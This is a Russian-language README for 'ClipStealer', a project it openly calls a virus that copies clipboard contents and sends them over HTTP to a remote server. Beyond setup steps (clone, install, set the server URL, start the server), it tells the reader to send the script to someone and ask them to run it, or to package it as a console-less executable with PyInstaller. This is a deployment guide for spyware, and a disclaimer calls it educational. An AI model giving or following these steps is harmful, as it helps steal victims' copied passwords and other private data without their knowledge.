# CleapStealer - вирус, копирующий всю информацию из буфера обмена.

## Описание

Программа позволяет перехватывать данные из буфера обмена и отправлять их на удалённый сервер. Этот проект создан исключительно для образовательных целей, чтобы понять, как подобные механизмы работают, и как защититься от них.

## Возможности

- Мониторинг буфера обмена.
- Сохранение текста, копируемого пользователем.
- Отправка данных на сервер через HTTP-запросы.

## Установка и запуск

### Шаг 1: Скачивание

Клонируйте репозиторий на своё устройство:

```bash
git clone https://github.com/Filinsl/ClipStealer.git
```

### Шаг 2: Установка зависимостей

Перейдите в директорию проекта и установите зависимости:

```bash
cd ClipStealer
pip install -r requirements.txt
```

### Шаг 3: Редактирование 
Замените  ссылку в файле ClipStealer.py на Url сервера для отправки запроса
```
SERVER_URL = 'example_url/api/clipboard' 
```
### Шаг 4: Запуск сервера

Запустите сервер:

```bash
python server.py
```



### Шаг 5: Отправка файла
Вы можете отправить кому то файл ClipStealer.py и попросить запустить через консоль

```bash
python ClipStealer.py
```
Или вы можете собрать exe файл, например с помощью PyInstaller

```bash
pyinstaller --onefile --noconsole ClipStealer.py
```

## Отказ от ответсвенности

Этот проект предоставлен исключительно для образовательных целей. Любое несанкционированное использование кода может быть наказуемо законом.

